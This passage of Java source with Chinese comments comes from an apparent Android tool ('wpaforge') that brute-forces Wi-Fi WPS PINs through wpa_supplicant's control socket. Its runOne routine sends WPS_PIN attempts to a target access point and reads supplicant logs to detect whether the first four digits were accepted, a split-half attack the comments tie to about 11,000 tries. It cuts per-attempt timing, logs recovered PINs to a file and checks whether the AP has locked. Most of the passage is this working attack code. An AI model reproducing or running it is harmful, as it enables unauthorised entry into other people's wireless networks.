     *   <li>{@code 0} 能读到状态但已经不是「已连上、非 WPS」：连接没稳住 → 降级为疑似；</li>
     *   <li>{@code -1} 读不到（空回复 / 异常）：**未知**，不得据此降级。</li>
     * </ul>
     *
     * <p>修复前这里把「读不到」也算成 0；因为当时 confirm 不参与判定，
     * 后果只是日志里多一个 0。现在它进判定，就必须区分「掉了」与「没读到」。
     */
    static int confirmOf(String reply) {
        if (reply == null || reply.trim().isEmpty()) return -1;
        boolean up = "COMPLETED".equals(field(reply, "wpa_state"))
                && !"WPS".equals(field(reply, "key_mgmt"));
        return up ? 1 : 0;
    }

    /** 把已采集的原始事实装进判定输入（判定只在 WpsHitJudge 里做）。 */
    static WpsHitJudge.In evidenceOf(Stats st) {
        WpsHitJudge.In in = new WpsHitJudge.In(
                st.targetBssid, st.targetSsid, st.baseNetId, st.hitNetId,
                st.hitState, st.hitKeyMgmt);
        in.connSsid = st.hitSsid;
        in.connBssid = st.hitBssid;
        in.connIp = st.hitIp;
        in.confirm = st.hitConfirm;
        in.sawTargetWpsSession = st.sawTargetWpsSession;
        in.sawWpsSessionElsewhere = st.sawWpsSessionElsewhere;
        return in;
    }

    /**
     * 批量模式下的证据行（跟在 {@code PIN=…} 行后面）。
     *
     * <p>为什么另起一行：{@code parseBatchLine} 按空白切字段，SSID 里带空格会把
     * 整行切碎。这里所有值先 URL 编码（空格 → +），解析端再解回来。
     */
    static String evidenceLine(Stats st, String pin) {
        StringBuilder sb = new StringBuilder("HIT");
        sb.append(" PIN=").append(enc(pin));
        sb.append(" VERDICT=").append(enc(st.hitVerdict));
        sb.append(" TSSID=").append(enc(st.targetSsid));
        sb.append(" CSSID=").append(enc(st.hitSsid));
        sb.append(" CBSSID=").append(enc(st.hitBssid));
        sb.append(" IP=").append(enc(st.hitIp));
        sb.append(" CID=").append(st.hitNetId);
        sb.append(" BASE=").append(st.baseNetId);
        sb.append(" CONFIRM=").append(st.hitConfirm);
        sb.append(" SESS=").append(st.sawTargetWpsSession ? 1 : 0);
        sb.append(" FACTS=").append(enc(st.hitFacts));
        sb.append(" WHY=").append(enc(st.hitWhy));
        return sb.toString();
    }

    /** URL 编码（空格 → +）：保证证据值里绝不出现空白。 */
    static String enc(String v) {
        if (v == null) return "";
        try {
            return java.net.URLEncoder.encode(v, "UTF-8");
        } catch (Throwable t) {
            return "";
        }
    }

    /** {@link #enc} 的逆运算。 */
    static String dec(String v) {
        if (v == null) return "";
        try {
            return java.net.URLDecoder.decode(v, "UTF-8");
        } catch (Throwable t) {
            return "";
        }
    }

    // ---------------- supplicant 日志 ----------------
    //
    // 本机最值钱的信息源。Android 的 supplicant 以 -dd 模式跑，
    // 日志里有 WPS-M2D、CTRL-EVENT-EAP-METHOD (WSC)、WPS-TIMEOUT 这些
    // 通过 ctrl_iface 完全拿不到的内部状态（这个版本的 ATTACH 被禁了）。
    //
    // 对拆半攻击尤其关键：PIN 前 4 位对/错，只体现在「M2D 之后还有没有消息」上。

    /**
     * 本轮日志窗口的**起点锚点**（毫秒）。
     *
     * <h3>2026-10-24 最终审计 P0-3：不再清空全局缓冲</h3>
     * 原来这里是 {@code logcat -c} —— 那是**全局**副作用：把整机所有组件的
     * 日志缓冲一起清掉（用户随后想抓任何现场都没了），而且清空是否成功从不校验。
     * 现在只记一个时刻，读取时用 {@code -t '<时刻>'} 切片：本轮之后的行才要，
     * 别人的日志一条不动。
     */
    private static volatile long logAnchorMs = 0L;

    static void logClear() {
        logAnchorMs = System.currentTimeMillis();
    }

    /**
     * 抓本轮 supplicant 日志，压平成一行。
     *
     * <h3>窗口起点＝时间锚点（不再依赖清空全局缓冲）</h3>
     * {@code logcat -d -s wpa_supplicant:V -t '<MM-DD HH:MM:SS.mmm>'} 只输出该时刻之后的
     * 行（见 {@link Lc}），所以既不用清空全局缓冲，也不会把上一轮的行算进本轮。
     * 锚点缺失（异常路径）时退回旧的「最近 5000 行」，行为与改前一致。
     *
     * 坑：`-t N` 限制的是**过滤前**的原始行数。系统日志刷得很快，
     * 用 `-t 200` 时 wpa_supplicant 的行会被别人的日志挤掉（我踩过，
     * 结果只剩两行 timeout，看着像「AP 没响应」，其实 M2D 一直都有）。
     * 换成时间锚点后这个问题不存在：窗口内该有的行都会在。
     */
    static String logTail() {
        long anchor = logAnchorMs;
        String cmd = anchor > 0
                ? io.github.wlmosv_png.wpaforge.audit.Lc.withSince(
                        "logcat -d -s wpa_supplicant:V", anchor)
                : "logcat -d -s wpa_supplicant:V -t 5000";
        String out = exec(cmd, 8000);
        StringBuilder sb = new StringBuilder();
        if (out != null) {
            for (String ln : out.split("\n")) {
                String t = ln.trim();
                if (t.isEmpty()) continue;
                if (t.contains("WPS") || t.contains("EAP") || t.contains("timed out")
                        || t.contains("Associated with") || t.contains("DISCONNECTED")) {
                    int i = t.indexOf("wpa_supplicant: ");
                    String body = i > 0 ? t.substring(i + 16) : t;
                    String ts = t.length() > 18 ? t.substring(6, 18) : "";
                    sb.append(ts).append(' ').append(body).append(" | ");
                }
            }
        }
        return sb.toString().trim();
    }

    /**
     * 日志指纹。拆半攻击就靠这个判断「前 4 位是否被接受」：
     *   M2D_THEN_MORE = M2D 之后还有 WPS 消息 → 前 4 位对
     *   M2D_ONLY      = M2D 之后静默到超时     → 前 4 位错
     */
    static String logKind(String log) {
        if (log == null || log.isEmpty()) return "NONE";
        int i = log.indexOf("WPS-M2D");
        if (i < 0) {
            return (log.contains("EAP-METHOD") || log.contains("EAP-STARTED"))
                    ? "EAP_ONLY" : "NONE";
        }
        String after = log.substring(i + 7);
        for (String m : new String[]{"WPS-M3", "WPS-M4", "WPS-M5", "WPS-M6",
                "WPS-M7", "WPS-M8", "WPS-NACK", "WPS-SUCCESS", "WPS-FAIL"}) {
            if (after.contains(m)) return "M2D_THEN_MORE";
        }
        return "M2D_ONLY";
    }

    /** 超过这个时间还没进 ASSOCIATING，就当目标不理我们。 */
    static final long NO_ASSOC_GIVEUP_MS = 9000;

    /**
     * 单次尝试的核心。结果分四类（都有真机时序支撑）：
     *
     *   SUCCESS      出现新 netId 且已用非 WPS 的 key_mgmt 连上 —— WPS 落地，拿到口令
     *   REJECTED     进过 km=WPS 的关联后被断开 —— AP 真的在跟我们做 WPS 协商，
     *                只是这个 PIN 不对。**这是「AP 可攻击」的铁证。**
     *   NO_ASSOC     关联上过，但从没进 km=WPS —— 关联被拒
     *   NO_RESPONSE  一直 SCANNING、压根没关联 —— AP 不在配对窗口
     *
     * 实测时序（2026-10-22，本机）：
     *   WIFI-8F65  0ms 发命令 → 6.0s SCANNING → 7.3s ASSOCIATED(km=WPS) → 7.3s 掉回 SCANNING
     *   B201       0ms 发命令 → 6.0s SCANNING → 7.3s ASSOCIATING          → 8.5s 掉回 SCANNING
     *
     * 所以「关联一结束就收工」：每次 7~9 秒，不再死等 20 秒窗口。
     */
    static Stats runOne(Conn c, String bssid, String pin, int timeoutSec) {
        return runOne(c, bssid, pin, timeoutSec, "");
    }

    /**
     * 单次尝试的核心（带目标 SSID）。
     *
     * <p>{@code targetSsid} 只服务于一件事：判定「连上的到底是不是目标」。
     * 留空时退化为「只用 BSSID 归属」，判不出来就记「疑似」而不是「命中」——
     * 宁可少报一次命中，也不能把别人家的网络算成目标的 PIN 命中。
     */
    static Stats runOne(Conn c, String bssid, String pin, int timeoutSec, String targetSsid) {
        Stats st = new Stats();
        st.targetBssid = bssid == null ? "" : bssid;
        st.targetSsid = targetSsid == null ? "" : targetSsid;
        String before = c.cmd("STATUS");
        int baseId = parseInt(field(before, "id"), -1);
        st.baseNetId = baseId;
        long t0 = System.currentTimeMillis();
        logClear();
        // WPS_PIN 是同步命令：正常时回显 PIN，失败时首字符是 FAIL
        // （FAIL / FAIL-BUSY / FAIL-CHANNEL / FAIL-INFO）。
        // 不检查的话，命令被拒也得白等满整个窗口 —— 长时间跑 11000 次时这个浪费很可观。
        String cmdReply = c.cmd("WPS_PIN " + bssid + " " + pin);
        String rp = cmdReply == null ? "" : cmdReply.trim();
        if (rp.startsWith("FAIL")) {
            st.result = "CMD_FAIL";
            st.logText = "WPS_PIN reply=" + rp;
            st.elapsedMs = System.currentTimeMillis() - t0;
            return st;
        }

        long assocStart = 0;
        boolean sawAssociated = false;
        String lastState = "";
        long limitMs = Math.max(3, timeoutSec) * 1000L;
        // 拆半用：M2D 出现后若无进展就提前收工（默认要等 9.5 秒 EAP 重传超时）
        boolean sawM2d = false;
        long m2dAt = 0;
        boolean sawEap = false;
        long eapAt = 0;
        int poll = 0;
        int emptyStatus = 0;
        /** M2D 之后静默多久算「前 4 位不对」。实测正常会一直静默到 9.5s 超时。 */
        final long M2D_STALL_MS = 2500;

        while (System.currentTimeMillis() - t0 < limitMs) {
            String s = c.cmd("STATUS");
            // 控制接口断了会一直返回空。没有这道判断的话，单次尝试要空转到超时才结束；
            // 跑 11000 次时 socket 失效是必然会遇到的事。
            if (s == null || s.trim().isEmpty()) {
                if (++emptyStatus >= 8) {
                    st.result = "LINK_LOST";
                    break;
                }
                sleep(200);
                continue;
            }
            emptyStatus = 0;
            String state = field(s, "wpa_state");
            String km = field(s, "key_mgmt");
            long now = System.currentTimeMillis();

            if (!state.equals(lastState)) {
                lastState = state;
                st.stages++;
            }
            if ("ASSOCIATING".equals(state) || "ASSOCIATED".equals(state)) {
                st.sawAssocPhase = true;
            }
            if ("ASSOCIATED".equals(state)) {
                sawAssociated = true;
                if ("WPS".equals(km)) {
                    st.sawWpsSession = true;
                    // 归属：这次 km=WPS 的会话开在哪个 BSSID 上。
                    // 读不到 bssid 时按目标算 —— 这条会话本来就是我们对目标发的命令开出来的；
                    // 但读到了就别的地方，必须记下来（那是「别的 AP 在跟我们配对」）。
                    String ab = field(s, "bssid");
                    if (ab.isEmpty() || ab.equalsIgnoreCase(st.targetBssid)) {
                        st.sawTargetWpsSession = true;
                    } else {
                        st.sawWpsSessionElsewhere = true;
                    }
                }
                if (assocStart == 0) {
                    assocStart = now;
                    st.assocCount++;
                }
            } else if (assocStart != 0) {
                long dur = now - assocStart;
                if (dur > st.maxAssocMs) st.maxAssocMs = dur;
                assocStart = 0;
            }

            int curId = parseInt(field(s, "id"), -1);
            if (isWpsHit(baseId, curId, state, km)) {
                // 「状态像成功」只说明「netId 变了 + 已用非 WPS 的 key_mgmt 连上」。
                // 这**不足以**判命中：手机在这段时间里连上别的网络（回连家里 WiFi、
                // framework 自动切换、另一频段的旧配置）同样满足上面三个条件，
                // 修复前就是这么把「别的网」记成「目标 PIN 命中」的。
                //
                // 归属 + 600ms 复核在这里收齐，交给 WpsHitJudge 出结论：
                //   CONFIRMED → SUCCESS
                //   UNVERIFIED → SUCCESS_UNVERIFIED（记疑似，不停任务）
                st.hitNetId = curId;
                sleep(600);
                String s2 = null;
                try {
                    s2 = c.cmd("STATUS");
                } catch (Throwable ignored) {
                    s2 = null;
                }
                // 读不到复核 ≠ 复核失败：空回复（控制接口抖了一下）只能记「未知」，
                // 拿它当「掉了」会把一条协议确认过的命中降级成「疑似」（假阴性）。
                st.hitConfirm = confirmOf(s2);
                // 归属优先用复核帧：刚连上时那一帧才最可能带着 ssid / bssid / ip
                String f2 = (s2 != null && !s2.trim().isEmpty()) ? s2 : s;
                st.hitState = field(f2, "wpa_state");
                st.hitKeyMgmt = field(f2, "key_mgmt");
                st.hitSsid = field(f2, "ssid");
                st.hitBssid = field(f2, "bssid");
                st.hitIp = field(f2, "ip_address");
                WpsHitJudge.In ev = evidenceOf(st);
                st.hitVerdict = WpsHitJudge.judge(ev);
                st.hitFacts = WpsHitJudge.facts(ev);
                st.hitWhy = WpsHitJudge.why(ev, false);
                st.result = WpsHitJudge.isHit(st.hitVerdict) ? "SUCCESS" : "SUCCESS_UNVERIFIED";
                break;
            }

            // 关联过之后又掉回扫描/断开 → 这一轮的结果已经出来了，不用再等
            boolean fellBack = "SCANNING".equals(state) || "DISCONNECTED".equals(state)
                    || "INACTIVE".equals(state);
            if (sawAssociated && fellBack) {
                st.result = st.sawWpsSession ? "REJECTED" : "NO_ASSOC";
                break;
            }
            // 连关联都没发生过，且已过了给它的时间 → 目标不理我们（多半不在配对窗口）
            if (!st.sawAssocPhase && (now - t0) > NO_ASSOC_GIVEUP_MS) {
                st.result = "NO_RESPONSE";
                break;
            }

            // 每 ~600ms 瞄一眼 supplicant 日志：
            // 看到 WPS-M2D 就记时间，之后若一直没进展 → 前 4 位不对，立刻收工。
            // 这一条把真 WPS 目标的单次耗时从 ~19s 压到 ~8s（拆半 11000 次才有戏）。
            if (++poll % 3 == 0) {
                String lt = logTail();
                if (!sawM2d && lt.contains("WPS-M2D")) {
                    sawM2d = true;
                    m2dAt = now;
                } else if (sawM2d && lt.contains("WPS-M3")) {
                    // M2 被接受 —— 前 4 位对了！交给上层判定
                    st.logText = lt;
                    st.logKind = "M2D_THEN_MORE";
                    st.result = "HALF_OK";
                    break;
                }
                if (sawM2d && (now - m2dAt) > M2D_STALL_MS) {
                    st.logText = lt;
                    st.logKind = "M2D_STALL";
                    st.result = "PIN_REJECTED";
                    break;
                }
                // 兜底：EAP 已开始却迟迟等不到 M2D（偶发日志缺失/AP 没回），
                // 也别等满 9.5 秒的 EAP 重传超时。
                if (!sawM2d && !sawEap && lt.contains("EAP-STARTED")) {
                    sawEap = true;
                    eapAt = now;
                }
                if (sawEap && !sawM2d && (now - eapAt) > 4000) {
                    st.logText = lt;
                    st.logKind = "EAP_STALL";
                    st.result = "PIN_REJECTED";
                    break;
                }
            }
            sleep(200);
        }
        if (assocStart != 0) {
            long dur = System.currentTimeMillis() - assocStart;
            if (dur > st.maxAssocMs) st.maxAssocMs = dur;
        }
        st.elapsedMs = System.currentTimeMillis() - t0;
        if (st.result.startsWith("SUCCESS")) {
            // 命中是最不能丢的事件：日志会轮转、App 可能被杀，所以直接落盘。
            // 疑似命中同样落盘（带 verdict），否则「证据不足」这件事会随日志轮转消失。
            try {
                java.io.FileWriter fw = new java.io.FileWriter(
                        "/data/local/tmp/wpaforge-hit.txt", true);
                fw.write("HIT verdict=" + st.hitVerdict
                        + " bssid=" + bssid + " pin=" + pin
                        + " connBssid=" + st.hitBssid + " ssid=" + st.hitSsid
                        + " targetSsid=" + st.targetSsid + " ip=" + st.hitIp
                        + " confirm=" + st.hitConfirm
                        + " netId=" + st.hitNetId + " baseId=" + st.baseNetId
                        + " facts=" + st.hitFacts + " why=" + st.hitWhy
                        + " time=" + new java.util.Date() + "\n");
                fw.close();
            } catch (Throwable ignored) {
            }
        }
        if (sawM2d) st.m2dToEndMs = System.currentTimeMillis() - m2dAt;
        st.logText = logTail();
        st.logKind = logKind(st.logText);
        // 顺手复查一次 beacon：AP 是不是把我们锁了（0x1057）。
        // 这是「跑了半天忽然打不动」最常见的原因，必须每次都能看到。
        try {
            String bs = c.cmd("BSS " + bssid);
            if (bs != null && !bs.trim().isEmpty() && !bs.startsWith("FAIL")) {
                st.apLocked = apSetupLocked(bssField(bs, "ie")) ? 1 : 0;
            }
        } catch (Throwable ignored) {
        }
        return st;
    }

    // ---------------- 工具 ----------------

    static String exec(String cmd, long timeoutMs) {
        StringBuilder sb = new StringBuilder();
        Process p = null;
        try {
            p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            final Process fp = p;
            Thread killer = new Thread(() -> {
                try {
                    Thread.sleep(timeoutMs);
                    fp.destroy();
                } catch (Throwable ignored) {
                }
            });
            killer.setDaemon(true);
            killer.start();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append('\n');
            br.close();
            killer.interrupt();
        } catch (Throwable t) {
            if (p != null) p.destroy();
        }
        return sb.toString();
    }

    static void execLocal(String cmd, long ms) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            p.waitFor();
        } catch (Throwable ignored) {
        }
    }

    static String field(String text, String key) {
        if (text == null) return "";
        for (String line : text.split("\n")) {
            int i = line.indexOf('=');
            if (i > 0 && line.substring(0, i).trim().equals(key)) {
                return line.substring(i + 1).trim();
            }
        }
        return "";
    }

    /**
     * WPS 命中判定（纯函数，可离线穷举）。
     *
     * <h3>D3：为什么必须校验 id 的有效性</h3>
     * {@code id} 来自 wpa_supplicant 的 {@code STATUS} 文本。解析失败时
     * {@link #parseInt} 返回 {@code -1}（哨兵）。原判定写作
     * <pre>
     *   curId != baseId && COMPLETED && !WPS
     * </pre>
     * 这在**任一侧解析失败**时都会无条件成立：
     * <ul>
     *   <li>{@code baseId = -1}（STATUS 读失败/超时）而 {@code curId = 0}
     *       → {@code 0 != -1} 成立 → 误报命中；</li>
     *   <li>{@code curId = -1}（这一帧读失败）而 {@code baseId = 3}
     *       → {@code -1 != 3} 成立 → 误报命中。</li>
     * </ul>
     * 换言之：「读不到」被当成了「状态变了」。
     *
     * <h3>修正后的语义</h3>
     * 只有两侧都拿到**有效 id**（{@code >= 0}）且**确实不同**，才算状态变化。
     * 任一侧无效 → 不可判定 → 返回 {@code false}（绝不产生成功结论）。
     *
     * @param baseId  下发 PIN 前的 network id；{@code < 0} = 读失败
     * @param curId   轮询中读到的 network id；{@code < 0} = 读失败
     * @param state   wpa_state
     * @param keyMgmt key_mgmt
     */
    static boolean isWpsHit(int baseId, int curId, String state, String keyMgmt) {
        // D3 修复：任一侧 id 无效（< 0 = 解析失败）时一律视为**不可判定**。
        // 旧实现直接比较 curId != baseId，于是「读不到」会被当成「状态变了」：
        //   baseId=-1 且 curId=0 -> 0 != -1 成立 -> 误报命中（错误 PIN 也可能中招）。
        // 宁可漏判一次（等待后续轮次重新读），也不能把读失败做成成功证据。
        if (baseId < 0 || curId < 0) return false;
        return curId != baseId && "COMPLETED".equals(state) && !"WPS".equals(keyMgmt);
    }

    static int parseInt(String s, int def) {
        try {
            return Integer.parseInt(s.trim());
        } catch (Throwable t) {
            return def;
        }
    }

    static String oneLine(String s) {
        return s == null ? "" : s.replace("\n", " | ").trim();
    }

    static String join(String[] a, int from, int to) {
        StringBuilder sb = new StringBuilder();
        for (int i = from; i < to; i++) {
            if (sb.length() > 0) sb.append(' ');
            sb.append(a[i]);
        }
        return sb.toString();
    }

    static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException ignored) {
        }
    }

    /** 控制接口连接。每次绑定唯一 abstract 名称，避免遗留地址冲突。 */
    static final class Conn {
        final LocalSocket sock;
        final OutputStream os;
        final InputStream is;

        Conn() throws Exception {
            String name = "wpaforge_" + android.os.Process.myPid()
                    + "_" + (System.nanoTime() % 1000000);
            sock = new LocalSocket(LocalSocket.SOCKET_DGRAM);
            sock.bind(new LocalSocketAddress(name, LocalSocketAddress.Namespace.ABSTRACT));
            sock.connect(new LocalSocketAddress(SOCK, LocalSocketAddress.Namespace.FILESYSTEM));
            sock.setSoTimeout(1200);
            os = sock.getOutputStream();
            is = sock.getInputStream();
        }

        /** 只读一次，不发送命令 —— 用于收 supplicant 事件流。 */
        String read() {
            try {
                byte[] buf = new byte[65536];
                int n = is.read(buf);
                return n > 0 ? new String(buf, 0, n, "UTF-8") : "";
            } catch (Throwable t) {
                return "";
            }
        }

        String cmd(String c) {
            try {
                os.write((c + "\n").getBytes("UTF-8"));
                os.flush();
            } catch (Throwable t) {
                return "";
            }
            try {
                byte[] buf = new byte[65536];
                int n = is.read(buf);
                return n > 0 ? new String(buf, 0, n, "UTF-8") : "";
            } catch (Throwable t) {
                return "";
            }
        }

        void close() {
            try {
                sock.close();
            } catch (Throwable ignored) {
            }
        }
    }
}
